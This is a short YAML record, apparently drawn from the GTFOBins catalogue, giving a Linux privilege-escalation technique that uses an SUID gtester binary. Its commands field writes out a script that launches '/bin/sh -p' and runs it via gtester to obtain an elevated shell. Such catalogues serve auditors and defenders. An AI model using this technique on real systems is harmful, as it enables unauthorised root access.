id: gtfobins/gtester/shell/suid
type: binary
platform: linux
name: gtester
phases:
- execution
- privilege-escalation
capabilities:
- shell
privilege_required: suid
sources:
- project: GTFOBins
  upstream_url: https://gtfobins.github.io
  license: GPL-3.0
  upstream_version: acd5246
  last_synced: '2026-08-25'
commands:
- template: 'echo ''#!/bin/sh -p'' >/path/to/temp-file

    echo ''exec /bin/sh -p 0<&1'' >>/path/to/temp-file

    chmod +x /path/to/temp-file

    gtester -q /path/to/temp-file'
references:
- https://gtfobins.github.io/gtfobins/gtester/
tags:
